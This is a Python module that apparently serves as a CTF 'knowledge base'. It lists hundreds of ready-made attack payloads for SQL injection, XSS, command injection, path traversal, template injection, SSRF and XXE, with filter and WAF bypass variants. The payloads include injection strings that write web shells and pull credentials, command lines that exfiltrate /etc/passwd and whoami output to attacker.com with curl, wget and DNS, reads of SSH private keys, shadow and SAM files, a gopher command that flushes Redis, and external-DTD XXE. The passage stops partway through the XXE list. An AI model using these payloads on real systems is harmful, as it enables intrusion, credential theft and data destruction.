"""
Enhanced CTF Knowledge Base v2.0 - 增强版知识库

升级内容:
1. 漏洞类型: 8种  25+种
2. Payload数量: 每类5-7个  每类50+个
3. 新增WAF绕过技术库
4. 新增多阶段攻击链
5. 新增智能检测方法
6. 新增平台特定Payload

Author: SeaOf0
Version: 2.0.0
"""

import re
import json
from typing import Dict, List, Any, Optional, Set, Tuple
from dataclasses import dataclass, field
from enum import Enum
from datetime import datetime


# ==================== 扩展漏洞类型枚举 ====================

class ExtendedVulnerabilityType(Enum):
    """扩展漏洞类型枚举 - 25种"""
    # 注入类
    SQL_INJECTION = "sqli"
    NOSQL_INJECTION = "nosqli"
    LDAP_INJECTION = "ldapi"
    XPATH_INJECTION = "xpathi"
    COMMAND_INJECTION = "cmdi"
    CODE_INJECTION = "codei"
    EXPRESSION_INJECTION = "eli"

    # 文件类
    LFI = "lfi"
    RFI = "rfi"
    PATH_TRAVERSAL = "traversal"
    FILE_UPLOAD = "upload"
    ARBITRARY_FILE_READ = "afr"
    ARBITRARY_FILE_WRITE = "afw"

    # 客户端类
    XSS = "xss"
    CSRF = "csrf"
    OPEN_REDIRECT = "redirect"
    CLICKJACKING = "clickjack"

    # 服务端类
    SSRF = "ssrf"
    XXE = "xxe"
    SSTI = "ssti"
    DESERIALIZATION = "deser"

    # 认证授权类
    IDOR = "idor"
    JWT = "jwt"
    OAUTH = "oauth"
    BROKEN_AUTH = "bauth"

    # 其他高级类
    RACE_CONDITION = "race"
    PROTOTYPE_POLLUTION = "prototype"
    MEMORY_CORRUPTION = "memcorrupt"
    BUSINESS_LOGIC = "logic"


# ==================== SQL注入 Payload库 (50+) ====================

SQL_INJECTION_PAYLOADS = {
    # 基础检测 (10个)
    "basic": [
        {"payload": "'", "desc": "单引号测试", "indicators": ["error", "syntax"]},
        {"payload": "\"", "desc": "双引号测试", "indicators": ["error", "syntax"]},
        {"payload": "'--", "desc": "单引号注释", "indicators": []},
        {"payload": "' OR '1'='1", "desc": "万能密码", "indicators": []},
        {"payload": "' OR '1'='1'--", "desc": "万能密码注释", "indicators": []},
        {"payload": "' OR 1=1--", "desc": "数值型万能", "indicators": []},
        {"payload": "1' AND '1'='1", "desc": "布尔真", "indicators": []},
        {"payload": "1' AND '1'='2", "desc": "布尔假", "indicators": []},
        {"payload": "admin'--", "desc": "管理员绕过", "indicators": []},
        {"payload": "') OR ('1'='1", "desc": "括号闭合", "indicators": []},
    ],

    # UNION注入 (15个)
    "union": [
        {"payload": "' UNION SELECT NULL--", "desc": "1列UNION", "indicators": []},
        {"payload": "' UNION SELECT NULL,NULL--", "desc": "2列UNION", "indicators": []},
        {"payload": "' UNION SELECT NULL,NULL,NULL--", "desc": "3列UNION", "indicators": []},
        {"payload": "' UNION SELECT NULL,NULL,NULL,NULL--", "desc": "4列UNION", "indicators": []},
        {"payload": "' UNION SELECT NULL,NULL,NULL,NULL,NULL--", "desc": "5列UNION", "indicators": []},
        {"payload": "' UNION SELECT 1,2,3--", "desc": "数字定位", "indicators": ["1", "2", "3"]},
        {"payload": "' UNION SELECT @@version,NULL,NULL--", "desc": "MySQL版本", "indicators": ["5.", "8."]},
        {"payload": "' UNION SELECT version(),NULL,NULL--", "desc": "PostgreSQL版本", "indicators": []},
        {"payload": "' UNION SELECT user(),NULL,NULL--", "desc": "当前用户", "indicators": []},
        {"payload": "' UNION SELECT database(),NULL,NULL--", "desc": "当前数据库", "indicators": []},
        {"payload": "' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--", "desc": "枚举表名", "indicators": []},
        {"payload": "' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--", "desc": "枚举列名", "indicators": []},
        {"payload": "' UNION SELECT CONCAT(username,':',password),NULL,NULL FROM users--", "desc": "提取凭据", "indicators": []},
        {"payload": "' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL--", "desc": "文件读取", "indicators": ["root:"]},
        {"payload": "' UNION SELECT NULL,NULL,NULL INTO OUTFILE '/tmp/shell.php'--", "desc": "写文件", "indicators": []},
    ],

    # 时间盲注 (10个)
    "time_blind": [
        {"payload": "' AND SLEEP(5)--", "desc": "MySQL延时5s", "indicators": []},
        {"payload": "' AND SLEEP(3)--", "desc": "MySQL延时3s", "indicators": []},
        {"payload": "'; WAITFOR DELAY '0:0:5'--", "desc": "MSSQL延时", "indicators": []},
        {"payload": "' AND pg_sleep(5)--", "desc": "PostgreSQL延时", "indicators": []},
        {"payload": "' OR SLEEP(5)--", "desc": "OR延时", "indicators": []},
        {"payload": "1' AND IF(1=1,SLEEP(5),0)--", "desc": "条件延时", "indicators": []},
        {"payload": "1' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--", "desc": "逐字符提取", "indicators": []},
        {"payload": "' AND BENCHMARK(5000000,MD5('test'))--", "desc": "BENCHMARK延时", "indicators": []},
        {"payload": "1;SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--", "desc": "PG条件延时", "indicators": []},
        {"payload": "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", "desc": "子查询延时", "indicators": []},
    ],

    # 报错注入 (10个)
    "error_based": [
        {"payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--", "desc": "EXTRACTVALUE报错", "indicators": ["~"]},
        {"payload": "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1)--", "desc": "UPDATEXML报错", "indicators": ["~"]},
        {"payload": "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--", "desc": "FLOOR报错", "indicators": [":"]},
        {"payload": "' AND EXP(~(SELECT * FROM (SELECT version())a))--", "desc": "EXP报错", "indicators": []},
        {"payload": "' AND GTID_SUBSET(CONCAT(0x7e,(SELECT version())),1)--", "desc": "GTID报错", "indicators": ["~"]},
        {"payload": "' AND JSON_KEYS((SELECT CONVERT((SELECT version()) USING utf8)))--", "desc": "JSON报错", "indicators": []},
        {"payload": "' AND polygon((SELECT * FROM (SELECT version())a))--", "desc": "POLYGON报错", "indicators": []},
        {"payload": "' AND ST_LatFromGeoHash((SELECT version()))--", "desc": "GeoHash报错", "indicators": []},
        {"payload": "' AND ST_LongFromGeoHash((SELECT version()))--", "desc": "GeoHash报错2", "indicators": []},
        {"payload": "' AND ST_PointFromGeoHash((SELECT version()),1)--", "desc": "Point报错", "indicators": []},
    ],

    # WAF绕过 (15个)
    "waf_bypass": [
        {"payload": "'/**/UNION/**/SELECT/**/NULL--", "desc": "注释绕过", "bypass": "comment"},
        {"payload": "' UniOn SeLeCt NULL--", "desc": "大小写混淆", "bypass": "case"},
        {"payload": "'%20UNION%20SELECT%20NULL--", "desc": "URL编码空格", "bypass": "encoding"},
        {"payload": "'%0aUNION%0aSELECT%0aNULL--", "desc": "换行符绕过", "bypass": "newline"},
        {"payload": "' UN/**/ION SEL/**/ECT NULL--", "desc": "内联注释分割", "bypass": "inline"},
        {"payload": "' /*!50000UNION*/ /*!50000SELECT*/ NULL--", "desc": "版本注释", "bypass": "version"},
        {"payload": "'||UNION||SELECT||NULL--", "desc": "管道符连接", "bypass": "pipe"},
        {"payload": "' UNION ALL SELECT NULL--", "desc": "UNION ALL", "bypass": "union_all"},
        {"payload": "'+UNION+SELECT+NULL--", "desc": "加号空格", "bypass": "plus"},
        {"payload": "'%09UNION%09SELECT%09NULL--", "desc": "Tab绕过", "bypass": "tab"},
        {"payload": "' UNION%23%0aSELECT NULL--", "desc": "注释换行", "bypass": "comment_newline"},
        {"payload": "'-1' UNION SELECT NULL--", "desc": "负数闭合", "bypass": "negative"},
        {"payload": "' AND 1=0 UNION SELECT NULL--", "desc": "假条件UNION", "bypass": "false_condition"},
        {"payload": "' UNION (SELECT NULL)--", "desc": "括号包裹", "bypass": "parentheses"},
        {"payload": "'/**/AND/**/1=0/**/UNION/**/SELECT/**/NULL--", "desc": "全注释绕过", "bypass": "full_comment"},
    ],
}


# ==================== XSS Payload库 (50+) ====================

XSS_PAYLOADS = {
    # 基础XSS (15个)
    "basic": [
        {"payload": "<script>alert(1)</script>", "desc": "基础script", "context": "html"},
        {"payload": "<script>alert(document.domain)</script>", "desc": "domain弹窗", "context": "html"},
        {"payload": "<script>alert(document.cookie)</script>", "desc": "cookie弹窗", "context": "html"},
        {"payload": "<img src=x onerror=alert(1)>", "desc": "img onerror", "context": "html"},
        {"payload": "<svg onload=alert(1)>", "desc": "svg onload", "context": "html"},
        {"payload": "<body onload=alert(1)>", "desc": "body onload", "context": "html"},
        {"payload": "<iframe src=javascript:alert(1)>", "desc": "iframe javascript", "context": "html"},
        {"payload": "<a href=javascript:alert(1)>click</a>", "desc": "a标签javascript", "context": "html"},
        {"payload": "<input onfocus=alert(1) autofocus>", "desc": "input autofocus", "context": "html"},
        {"payload": "<select onfocus=alert(1) autofocus>", "desc": "select autofocus", "context": "html"},
        {"payload": "<textarea onfocus=alert(1) autofocus>", "desc": "textarea autofocus", "context": "html"},
        {"payload": "<marquee onstart=alert(1)>", "desc": "marquee onstart", "context": "html"},
        {"payload": "<video src=x onerror=alert(1)>", "desc": "video onerror", "context": "html"},
        {"payload": "<audio src=x onerror=alert(1)>", "desc": "audio onerror", "context": "html"},
        {"payload": "<details open ontoggle=alert(1)>", "desc": "details ontoggle", "context": "html"},
    ],

    # 事件处理器 (15个)
    "event_handlers": [
        {"payload": "\" onmouseover=\"alert(1)", "desc": "onmouseover属性注入", "context": "attribute"},
        {"payload": "' onclick='alert(1)'", "desc": "onclick属性注入", "context": "attribute"},
        {"payload": "\" onfocus=\"alert(1)\" autofocus=\"", "desc": "onfocus注入", "context": "attribute"},
        {"payload": "' onload='alert(1)'", "desc": "onload注入", "context": "attribute"},
        {"payload": "\" onerror=\"alert(1)", "desc": "onerror注入", "context": "attribute"},
        {"payload": "javascript:alert(1)//", "desc": "javascript伪协议", "context": "url"},
        {"payload": "data:text/html,<script>alert(1)</script>", "desc": "data协议", "context": "url"},
        {"payload": "\" onanimationend=\"alert(1)", "desc": "CSS动画事件", "context": "attribute"},
        {"payload": "\" ontransitionend=\"alert(1)", "desc": "CSS过渡事件", "context": "attribute"},
        {"payload": "\" ondrag=\"alert(1)", "desc": "拖拽事件", "context": "attribute"},
        {"payload": "\" ondragend=\"alert(1)", "desc": "拖拽结束", "context": "attribute"},
        {"payload": "\" onscroll=\"alert(1)", "desc": "滚动事件", "context": "attribute"},
        {"payload": "\" onwheel=\"alert(1)", "desc": "滚轮事件", "context": "attribute"},
        {"payload": "\" oncopy=\"alert(1)", "desc": "复制事件", "context": "attribute"},
        {"payload": "\" onpaste=\"alert(1)", "desc": "粘贴事件", "context": "attribute"},
    ],

    # WAF绕过 (15个)
    "waf_bypass": [
        {"payload": "<ScRiPt>alert(1)</ScRiPt>", "desc": "大小写混淆", "bypass": "case"},
        {"payload": "<script>alert(String.fromCharCode(49))</script>", "desc": "CharCode编码", "bypass": "charcode"},
        {"payload": "<script>eval(atob('YWxlcnQoMSk='))</script>", "desc": "Base64解码", "bypass": "base64"},
        {"payload": "<script>\\u0061lert(1)</script>", "desc": "Unicode转义", "bypass": "unicode"},
        {"payload": "<img src=x onerror=alert`1`>", "desc": "模板字符串", "bypass": "template"},
        {"payload": "<img src=x onerror=alert&lpar;1&rpar;>", "desc": "HTML实体", "bypass": "entity"},
        {"payload": "<img/src=x/onerror=alert(1)>", "desc": "斜杠分隔", "bypass": "slash"},
        {"payload": "<img src=x onerror='alert(1)'>", "desc": "单引号包裹", "bypass": "quote"},
        {"payload": "<%00script>alert(1)</script>", "desc": "空字节绕过", "bypass": "null"},
        {"payload": "<script>eval('al'+'ert(1)')</script>", "desc": "字符串拼接", "bypass": "concat"},
        {"payload": "<script>window['alert'](1)</script>", "desc": "方括号访问", "bypass": "bracket"},
        {"payload": "<script>this['alert'](1)</script>", "desc": "this引用", "bypass": "this"},
        {"payload": "<svg><script>alert&NewLine;(1)</script>", "desc": "SVG换行", "bypass": "svg_newline"},
        {"payload": "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>", "desc": "MathML嵌套", "bypass": "mathml"},
        {"payload": "<!--><svg onload=alert(1)>", "desc": "注释绕过", "bypass": "comment"},
    ],

    # DOM XSS (10个)
    "dom_based": [
        {"payload": "#<img src=x onerror=alert(1)>", "desc": "Hash注入", "context": "dom"},
        {"payload": "javascript:alert(document.domain)", "desc": "location注入", "context": "dom"},
        {"payload": "'-alert(1)-'", "desc": "JS字符串逃逸", "context": "js_string"},
        {"payload": "';alert(1)//", "desc": "JS语句注入", "context": "js_string"},
        {"payload": "\\'-alert(1)//", "desc": "反斜杠逃逸", "context": "js_string"},
        {"payload": "</script><script>alert(1)</script>", "desc": "标签闭合", "context": "js_block"},
        {"payload": "${alert(1)}", "desc": "模板注入", "context": "template_literal"},
        {"payload": "{{constructor.constructor('alert(1)')()}}", "desc": "Angular模板", "context": "angular"},
        {"payload": "[[${7*7}]]", "desc": "Thymeleaf注入", "context": "thymeleaf"},
        {"payload": "%24%7balert(1)%7d", "desc": "URL编码模板", "context": "encoded"},
    ],
}


# ==================== 命令注入 Payload库 (40+) ====================

COMMAND_INJECTION_PAYLOADS = {
    # 基础命令分隔 (10个)
    "basic": [
        {"payload": ";id", "desc": "分号分隔", "os": "unix"},
        {"payload": "|id", "desc": "管道符", "os": "unix"},
        {"payload": "||id", "desc": "OR运算符", "os": "unix"},
        {"payload": "&&id", "desc": "AND运算符", "os": "unix"},
        {"payload": "`id`", "desc": "反引号执行", "os": "unix"},
        {"payload": "$(id)", "desc": "命令替换", "os": "unix"},
        {"payload": "\nid", "desc": "换行符", "os": "unix"},
        {"payload": "\r\nid", "desc": "CRLF", "os": "unix"},
        {"payload": "&id", "desc": "后台执行", "os": "unix"},
        {"payload": "%0aid", "desc": "URL编码换行", "os": "unix"},
    ],

    # Windows命令 (10个)
    "windows": [
        {"payload": "&whoami", "desc": "Windows AND", "os": "windows"},
        {"payload": "|whoami", "desc": "Windows管道", "os": "windows"},
        {"payload": "||whoami", "desc": "Windows OR", "os": "windows"},
        {"payload": "&&whoami", "desc": "Windows AND链", "os": "windows"},
        {"payload": "\r\nwhoami", "desc": "Windows CRLF", "os": "windows"},
        {"payload": "%0a%0dwhoami", "desc": "编码CRLF", "os": "windows"},
        {"payload": "^|whoami", "desc": "转义管道", "os": "windows"},
        {"payload": "| ping -n 5 127.0.0.1", "desc": "时间延迟", "os": "windows"},
        {"payload": "& type C:\\Windows\\win.ini", "desc": "文件读取", "os": "windows"},
        {"payload": "| dir C:\\", "desc": "目录列举", "os": "windows"},
    ],

    # 盲注入 (10个)
    "blind": [
        {"payload": ";sleep 5", "desc": "延时5秒", "os": "unix"},
        {"payload": "|sleep 5", "desc": "管道延时", "os": "unix"},
        {"payload": "$(sleep 5)", "desc": "命令替换延时", "os": "unix"},
        {"payload": ";ping -c 5 127.0.0.1", "desc": "ping延时", "os": "unix"},
        {"payload": "|curl http://attacker.com/$(whoami)", "desc": "OOB外带", "os": "unix"},
        {"payload": ";wget http://attacker.com/$(id|base64)", "desc": "wget外带", "os": "unix"},
        {"payload": "$(curl http://attacker.com/?d=$(cat /etc/passwd|base64))", "desc": "数据外带", "os": "unix"},
        {"payload": ";nslookup $(whoami).attacker.com", "desc": "DNS外带", "os": "unix"},
        {"payload": "|ping -c 1 `whoami`.attacker.com", "desc": "DNS反引号", "os": "unix"},
        {"payload": "& ping /n 5 127.0.0.1", "desc": "Windows ping延时", "os": "windows"},
    ],

    # WAF绕过 (15个)
    "waf_bypass": [
        {"payload": ";i'd'", "desc": "引号分割", "bypass": "quote"},
        {"payload": ";i\\d", "desc": "反斜杠", "bypass": "backslash"},
        {"payload": ";$PATH", "desc": "变量混淆", "bypass": "variable"},
        {"payload": ";{id,}", "desc": "花括号", "bypass": "brace"},
        {"payload": ";id${IFS}", "desc": "IFS变量", "bypass": "ifs"},
        {"payload": ";id%09", "desc": "Tab替代空格", "bypass": "tab"},
        {"payload": ";/???/??", "desc": "通配符", "bypass": "wildcard"},
        {"payload": ";/???/i?", "desc": "模糊匹配", "bypass": "glob"},
        {"payload": ";$(printf 'id')", "desc": "printf构造", "bypass": "printf"},
        {"payload": ";$(echo aWQ=|base64 -d)", "desc": "Base64解码", "bypass": "base64"},
        {"payload": ";cat$IFS/etc/passwd", "desc": "IFS空格", "bypass": "ifs_space"},
        {"payload": ";cat</etc/passwd", "desc": "重定向读取", "bypass": "redirect"},
        {"payload": ";ca''t /etc/passwd", "desc": "空引号分割", "bypass": "empty_quote"},
        {"payload": ";ca\\t /etc/passwd", "desc": "反斜杠分割", "bypass": "backslash_split"},
        {"payload": ";rev<<<'dwssap/cte/tac'|bash", "desc": "字符串反转", "bypass": "reverse"},
    ],
}


# ==================== LFI/路径遍历 Payload库 (40+) ====================

LFI_PAYLOADS = {
    # 基础遍历 (10个)
    "basic": [
        {"payload": "../etc/passwd", "desc": "1层遍历", "indicators": ["root:"]},
        {"payload": "../../etc/passwd", "desc": "2层遍历", "indicators": ["root:"]},
        {"payload": "../../../etc/passwd", "desc": "3层遍历", "indicators": ["root:"]},
        {"payload": "../../../../etc/passwd", "desc": "4层遍历", "indicators": ["root:"]},
        {"payload": "../../../../../etc/passwd", "desc": "5层遍历", "indicators": ["root:"]},
        {"payload": "../../../../../../etc/passwd", "desc": "6层遍历", "indicators": ["root:"]},
        {"payload": "/etc/passwd", "desc": "绝对路径", "indicators": ["root:"]},
        {"payload": "....//....//....//etc/passwd", "desc": "双点过滤绕过", "indicators": ["root:"]},
        {"payload": "..\\..\\..\\etc\\passwd", "desc": "反斜杠遍历", "indicators": ["root:"]},
        {"payload": "..%2f..%2f..%2fetc/passwd", "desc": "URL编码斜杠", "indicators": ["root:"]},
    ],

    # PHP包装器 (15个)
    "php_wrappers": [
        {"payload": "php://filter/convert.base64-encode/resource=index.php", "desc": "Base64读源码", "indicators": ["PD9"]},
        {"payload": "php://filter/read=string.rot13/resource=index.php", "desc": "ROT13读源码", "indicators": []},
        {"payload": "php://filter/convert.iconv.utf-8.utf-16/resource=index.php", "desc": "编码转换", "indicators": []},
        {"payload": "php://input", "desc": "输入流(POST)", "indicators": []},
        {"payload": "php://filter/read=convert.base64-decode/resource=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==", "desc": "data+filter链", "indicators": []},
        {"payload": "data://text/plain,<?php phpinfo();?>", "desc": "data伪协议", "indicators": ["phpinfo"]},
        {"payload": "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==", "desc": "Base64 data", "indicators": []},
        {"payload": "expect://id", "desc": "expect执行命令", "indicators": ["uid="]},
        {"payload": "phar://./test.phar/test.txt", "desc": "phar协议", "indicators": []},
        {"payload": "zip://./test.zip%23test.txt", "desc": "zip协议", "indicators": []},
        {"payload": "compress.zlib://./test.gz", "desc": "zlib协议", "indicators": []},
        {"payload": "glob://./test/*", "desc": "glob协议", "indicators": []},
        {"payload": "php://filter/convert.base64-encode|convert.base64-decode/resource=index.php", "desc": "链式过滤器", "indicators": []},
        {"payload": "php://filter/zlib.deflate|convert.base64-encode/resource=index.php", "desc": "压缩编码", "indicators": []},
        {"payload": "php://filter/read=convert.quoted-printable-encode/resource=index.php", "desc": "QP编码", "indicators": []},
    ],

    # 敏感文件 (10个)
    "sensitive_files": [
        {"payload": "../../../etc/shadow", "desc": "密码哈希", "os": "linux"},
        {"payload": "../../../etc/hosts", "desc": "主机文件", "os": "linux"},
        {"payload": "../../../proc/self/environ", "desc": "环境变量", "os": "linux"},
        {"payload": "../../../proc/self/cmdline", "desc": "命令行", "os": "linux"},
        {"payload": "../../../var/log/apache2/access.log", "desc": "Apache日志", "os": "linux"},
        {"payload": "../../../var/log/nginx/access.log", "desc": "Nginx日志", "os": "linux"},
        {"payload": "../../../root/.ssh/id_rsa", "desc": "SSH私钥", "os": "linux"},
        {"payload": "../../../root/.bash_history", "desc": "历史命令", "os": "linux"},
        {"payload": "..\\..\\..\\windows\\win.ini", "desc": "Windows配置", "os": "windows"},
        {"payload": "..\\..\\..\\windows\\system32\\config\\sam", "desc": "SAM文件", "os": "windows"},
    ],

    # WAF绕过 (10个)
    "waf_bypass": [
        {"payload": "..%252f..%252f..%252fetc/passwd", "desc": "双重URL编码", "bypass": "double_encode"},
        {"payload": "..%c0%af..%c0%afetc/passwd", "desc": "UTF-8过长编码", "bypass": "overlong"},
        {"payload": "..%00/etc/passwd", "desc": "空字节截断", "bypass": "null_byte"},
        {"payload": "....//....//etc/passwd", "desc": "过滤绕过", "bypass": "filter_bypass"},
        {"payload": "..///..///..///etc/passwd", "desc": "多斜杠", "bypass": "multi_slash"},
        {"payload": "..;/..;/..;/etc/passwd", "desc": "分号绕过", "bypass": "semicolon"},
        {"payload": "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd", "desc": "全编码", "bypass": "full_encode"},
        {"payload": "..%5c..%5c..%5cetc/passwd", "desc": "编码反斜杠", "bypass": "encode_backslash"},
        {"payload": "..././..././..././etc/passwd", "desc": "冗余点斜杠", "bypass": "redundant"},
        {"payload": "%252e%252e%252f%252e%252e%252fetc/passwd", "desc": "三重编码", "bypass": "triple_encode"},
    ],
}


# ==================== SSTI Payload库 (35+) ====================

SSTI_PAYLOADS = {
    # 检测 Payload (10个)
    "detection": [
        {"payload": "{{7*7}}", "desc": "Jinja2/Twig检测", "indicators": ["49"]},
        {"payload": "${7*7}", "desc": "FreeMarker/Velocity检测", "indicators": ["49"]},
        {"payload": "#{7*7}", "desc": "Thymeleaf检测", "indicators": ["49"]},
        {"payload": "{{7*'7'}}", "desc": "Twig检测", "indicators": ["7777777"]},
        {"payload": "<%= 7*7 %>", "desc": "ERB/JSP检测", "indicators": ["49"]},
        {"payload": "{7*7}", "desc": "Smarty检测", "indicators": ["49"]},
        {"payload": "a]b", "desc": "Pebble检测", "indicators": ["a]b"]},
        {"payload": "${{7*7}}", "desc": "双括号检测", "indicators": ["49"]},
        {"payload": "@(7*7)", "desc": "Razor检测", "indicators": ["49"]},
        {"payload": "[[${7*7}]]", "desc": "Thymeleaf内联", "indicators": ["49"]},
    ],

    # Jinja2 RCE (10个)
    "jinja2_rce": [
        {"payload": "{{config}}", "desc": "配置泄露", "indicators": ["SECRET"]},
        {"payload": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}", "desc": "os.popen执行", "indicators": ["uid="]},
        {"payload": "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}", "desc": "文件读取", "indicators": ["root:"]},
        {"payload": "{{''.__class__.__mro__[1].__subclasses__()}}", "desc": "枚举子类", "indicators": ["class"]},
        {"payload": "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}", "desc": "request链", "indicators": ["uid="]},
        {"payload": "{{lipsum.__globals__['os'].popen('id').read()}}", "desc": "lipsum链", "indicators": ["uid="]},
        {"payload": "{{cycler.__init__.__globals__.os.popen('id').read()}}", "desc": "cycler链", "indicators": ["uid="]},
        {"payload": "{{joiner.__init__.__globals__.os.popen('id').read()}}", "desc": "joiner链", "indicators": ["uid="]},
        {"payload": "{{namespace.__init__.__globals__.os.popen('id').read()}}", "desc": "namespace链", "indicators": ["uid="]},
        {"payload": "{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}", "desc": "self链", "indicators": ["uid="]},
    ],

    # 其他模板引擎 (15个)
    "other_engines": [
        {"payload": "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}", "desc": "FreeMarker RCE", "indicators": ["uid="]},
        {"payload": "${\"freemarker.template.utility.Execute\"?new()(\"id\")}", "desc": "FreeMarker简化", "indicators": ["uid="]},
        {"payload": "[#assign ex = 'freemarker.template.utility.Execute'?new()]${ex('id')}", "desc": "FreeMarker赋值", "indicators": ["uid="]},
        {"payload": "${T(java.lang.Runtime).getRuntime().exec('id')}", "desc": "Spring EL", "indicators": []},
        {"payload": "#{T(java.lang.Runtime).getRuntime().exec('id')}", "desc": "Spring SpEL", "indicators": []},
        {"payload": "*{T(java.lang.Runtime).getRuntime().exec('id')}", "desc": "Spring *{}", "indicators": []},
        {"payload": "%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{'id'})).redirectErrorStream(true).start()}", "desc": "Struts2 OGNL", "indicators": []},
        {"payload": "{php}echo `id`;{/php}", "desc": "Smarty PHP", "indicators": ["uid="]},
        {"payload": "{system('id')}", "desc": "Smarty system", "indicators": ["uid="]},
        {"payload": "{{['id']|filter('system')}}", "desc": "Twig filter", "indicators": ["uid="]},
        {"payload": "{{['cat /etc/passwd']|filter('passthru')}}", "desc": "Twig passthru", "indicators": ["root:"]},
        {"payload": "<%= system('id') %>", "desc": "ERB system", "indicators": ["uid="]},
        {"payload": "<%= `id` %>", "desc": "ERB反引号", "indicators": ["uid="]},
        {"payload": "{{constructor.constructor('return this.process.mainModule.require(\"child_process\").execSync(\"id\")')()}}", "desc": "Nunjucks RCE", "indicators": ["uid="]},
        {"payload": "{% set x = 'id' | shellcmd %}{{ x }}", "desc": "Jinja2 shellcmd", "indicators": ["uid="]},
    ],
}


# ==================== SSRF Payload库 (30+) ====================

SSRF_PAYLOADS = {
    # 基础协议 (10个)
    "basic": [
        {"payload": "http://127.0.0.1", "desc": "本地回环", "indicators": []},
        {"payload": "http://localhost", "desc": "localhost", "indicators": []},
        {"payload": "http://[::1]", "desc": "IPv6回环", "indicators": []},
        {"payload": "http://0.0.0.0", "desc": "通配地址", "indicators": []},
        {"payload": "http://0", "desc": "简写0", "indicators": []},
        {"payload": "http://127.1", "desc": "简写127.1", "indicators": []},
        {"payload": "http://127.0.0.1:22", "desc": "SSH端口", "indicators": ["SSH"]},
        {"payload": "http://127.0.0.1:3306", "desc": "MySQL端口", "indicators": []},
        {"payload": "http://127.0.0.1:6379", "desc": "Redis端口", "indicators": ["REDIS"]},
        {"payload": "http://169.254.169.254", "desc": "云元数据", "indicators": ["ami-id"]},
    ],

    # 协议利用 (10个)
    "protocols": [
        {"payload": "file:///etc/passwd", "desc": "file读取", "indicators": ["root:"]},
        {"payload": "file:///c:/windows/win.ini", "desc": "Windows file", "indicators": ["fonts"]},
        {"payload": "dict://127.0.0.1:6379/info", "desc": "dict探测Redis", "indicators": ["redis"]},
        {"payload": "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a", "desc": "gopher攻击Redis", "indicators": []},
        {"payload": "ftp://127.0.0.1:21", "desc": "FTP探测", "indicators": []},
        {"payload": "sftp://127.0.0.1:22", "desc": "SFTP探测", "indicators": []},
        {"payload": "tftp://127.0.0.1:69", "desc": "TFTP探测", "indicators": []},
        {"payload": "ldap://127.0.0.1:389", "desc": "LDAP探测", "indicators": []},
        {"payload": "jar:http://attacker.com/evil.jar!/", "desc": "JAR协议", "indicators": []},
        {"payload": "netdoc:///etc/passwd", "desc": "netdoc协议", "indicators": ["root:"]},
    ],

    # 绕过技术 (15个)
    "bypass": [
        {"payload": "http://2130706433", "desc": "十进制IP", "bypass": "decimal"},
        {"payload": "http://0x7f000001", "desc": "十六进制IP", "bypass": "hex"},
        {"payload": "http://017700000001", "desc": "八进制IP", "bypass": "octal"},
        {"payload": "http://127.0.0.1.nip.io", "desc": "DNS重绑定", "bypass": "dns_rebind"},
        {"payload": "http://127。0。0。1", "desc": "中文句号", "bypass": "unicode_dot"},
        {"payload": "http://①②⑦.0.0.①", "desc": "圆圈数字", "bypass": "circle_num"},
        {"payload": "http://localtest.me", "desc": "解析到127的域名", "bypass": "domain"},
        {"payload": "http://spoofed.burpcollaborator.net@127.0.0.1", "desc": "用户名绕过", "bypass": "userinfo"},
        {"payload": "http://127.0.0.1#@attacker.com", "desc": "fragment绕过", "bypass": "fragment"},
        {"payload": "http://127.0.0.1%00@attacker.com", "desc": "空字节截断", "bypass": "null"},
        {"payload": "http://127.0.0.1?@attacker.com", "desc": "查询串绕过", "bypass": "query"},
        {"payload": "http://attacker.com/redirect?url=http://127.0.0.1", "desc": "开放重定向链", "bypass": "redirect"},
        {"payload": "http://127.0.0.1:80\\@attacker.com", "desc": "反斜杠绕过", "bypass": "backslash"},
        {"payload": "http://[0:0:0:0:0:ffff:127.0.0.1]", "desc": "IPv6映射IPv4", "bypass": "ipv6_mapped"},
        {"payload": "http://127.0.1", "desc": "省略零绕过", "bypass": "short_ip"},
    ],
}


# ==================== XXE Payload库 (25+) ====================

XXE_PAYLOADS = {
    # 基础XXE (10个)
    "basic": [
        {"payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', "desc": "基础文件读取", "indicators": ["root:"]},
        {"payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>', "desc": "Windows文件读取", "indicators": ["fonts"]},
        {"payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]><foo>&xxe;</foo>', "desc": "HTTP外部实体", "indicators": []},
        {"payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]>', "desc": "参数实体", "indicators": []},
        {"payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><foo>&xxe;</foo>', "desc": "PHP过滤器", "indicators": ["PD9"]},
        {"payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>', "desc": "expect执行", "indicators": ["uid="]},
